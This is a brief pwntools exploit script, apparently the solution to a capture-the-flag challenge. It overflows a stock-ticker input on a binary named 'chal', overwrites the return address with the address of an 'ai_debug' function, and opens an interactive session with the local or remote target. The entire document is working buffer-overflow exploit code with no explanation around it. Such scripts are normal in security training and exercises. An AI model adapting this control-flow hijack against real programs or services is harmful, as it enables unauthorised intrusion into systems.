from pwn import *

exe = context.binary = ELF("chal")

if args.REMOTE:
  r = remote("127.0.0.1", 42291)
else:
  r = process(exe.path)

payload = fit({17: p64(exe.sym.ai_debug) * 2})
print(payload)
r.sendlineafter("Please enter the stock ticker symbol: ", payload)
r.interactive()
